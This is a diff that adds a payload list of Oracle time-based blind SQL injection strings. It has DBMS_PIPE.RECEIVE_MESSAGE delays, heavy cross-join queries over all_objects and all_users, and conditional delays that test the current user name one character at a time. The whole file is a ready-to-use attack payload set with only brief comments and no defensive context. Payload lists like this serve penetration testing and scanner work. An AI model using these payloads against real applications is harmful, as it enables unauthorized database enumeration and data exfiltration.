@@ -1,0 +1,16 @@
+# Oracle — Time-Based Blind Payloads
+# Oracle has no SLEEP() — use DBMS_PIPE or heavy query
+
+# --- DBMS_PIPE (requires execute privilege) ---
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--
+'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65),5) FROM DUAL)||'
+' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=1)--
+
+# --- Heavy query (no privilege needed) ---
+' AND 1=(SELECT COUNT(*) FROM all_objects,all_objects,all_objects WHERE ROWNUM<100)--
+' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)--
+
+# --- Conditional delay ---
+' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) ELSE 1 END=1--
+' AND CASE WHEN (user='SYS') THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) ELSE 1 END=1--
+' AND CASE WHEN (SUBSTR(user,1,1)='S') THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) ELSE 1 END=1--
